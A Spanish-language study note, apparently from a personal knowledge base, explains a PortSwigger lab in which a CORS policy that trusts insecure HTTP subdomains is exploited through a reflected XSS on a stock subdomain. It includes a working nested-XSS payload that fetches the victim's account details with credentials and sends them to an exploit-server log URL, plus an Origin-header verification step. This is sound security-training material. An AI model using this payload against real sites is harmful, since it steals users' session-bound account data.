---
aliases:
  - CORS - pivot subdominio HTTP via XSS
  - trusted subdomain XSS
  - pivot subdomain
tags:
  - vuln/cors
  - example
  - portswigger
---

# Ejemplo — Pivot por subdominio HTTP vía XSS (trusts all subdomains)

> Lab: [CORS vulnerability with trusted insecure protocols](https://portswigger.net/web-security/cors/lab-breaking-https-attack) · técnica → [[vulnerabilities/005-cors/cors|entry point]]

**Qué demuestra:** el server confía en **cualquier subdominio, incluso por HTTP**. No podés MITM en el lab, así que **inyectás JS vía XSS** en un subdominio confiable (la página *Check stock* carga por HTTP desde `stock.*` y su `productId` es XSS). Desde ese origen confiable, el `fetch` a la API pasa el chequeo de CORS.

## PoC — redirigir a un XSS en el subdominio HTTP

El `<script>` del exploit server navega a la víctima al subdominio con el payload XSS anidado; ese payload corre **en el origen del subdominio** (confiable) y hace el `fetch` autenticado.

```html
<!-- Subir al exploit server → Deliver exploit to victim -->
<script>
document.location="http://stock.TARGET.web-security-academy.net/?productId=4<script>fetch('https://TARGET.web-security-academy.net/accountDetails',{credentials:'include'}).then(r=>r.text()).then(d=>location='https://EXPLOIT.exploit-server.net/log?key='%2bencodeURIComponent(d))%3c/script>&storeId=1"
</script>
```

> Encoding del payload anidado: `%2b` = `+` (concatenación), `%3c/script>` = `</script>` (para no cerrar el `<script>` externo antes de tiempo). El `productId` refleja el payload sin sanitizar → XSS en el subdominio.

## Verificación (Repeater)
Agregá a la request de datos:
```
Origin: http://stock.TARGET.web-security-academy.net
```
→ si vuelve reflejado en `Access-Control-Allow-Origin` (con esquema **http**) + `Allow-Credentials: true`, confirma que confía en subdominios y protocolos inseguros. Después buscás el XSS en el subdominio (`Check stock` → `productId`).
